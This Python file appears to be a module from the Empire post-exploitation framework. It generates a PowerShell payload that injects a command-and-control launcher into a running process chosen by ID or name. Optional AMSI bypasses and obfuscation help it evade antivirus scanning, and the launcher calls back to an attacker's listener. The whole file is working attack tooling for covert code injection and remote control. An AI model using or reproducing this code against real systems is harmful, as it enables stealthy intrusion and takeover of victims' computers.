from __future__ import print_function

from builtins import str
from builtins import object
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # Set booleans to false by default
        obfuscate = False
        amsi_bypass = False
        amsi_bypass2 = False

        listener_name = params['Listener']
        proc_id = params['ProcId'].strip()
        proc_name = params['ProcName'].strip()
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        obfuscate_command = params['ObfuscateCommand']
        if (params['AMSIBypass']).lower() == 'true':
            amsi_bypass = True
        if (params['AMSIBypass2']).lower() == 'true':
            amsi_bypass2 = True

        if proc_id == '' and proc_name == '':
            print(helpers.color("[!] Either ProcID or ProcName must be specified."))
            return ""

        # staging options
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']

        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/management/Invoke-PSInject.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""

        module_code = f.read()
        f.close()

        script = module_code
        script_end = ""
        if not main_menu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            print(helpers.color("[!] Invalid listener: %s" %(listener_name)))
            return ''
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', obfuscate=obfuscate, obfuscationCommand=obfuscate_command, encode=True, userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds, AMSIBypass=amsi_bypass, AMSIBypass2=amsi_bypass2)
            if launcher == '':
                print(helpers.color('[!] Error in launcher generation.'))
                return ''
            elif len(launcher) > 5952:
                print(helpers.color("[!] Launcher string is too long!"))
                return ''
            else:
                launcher_code = launcher.split(' ')[-1]

                if proc_id != '':
                    script_end += "Invoke-PSInject -ProcID %s -PoshCode %s" % (proc_id, launcher_code)
                else:
                    script_end += "Invoke-PSInject -ProcName %s -PoshCode %s" % (proc_name, launcher_code)

        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
        script += script_end
        script = helpers.keyword_obfuscation(script)

        return script
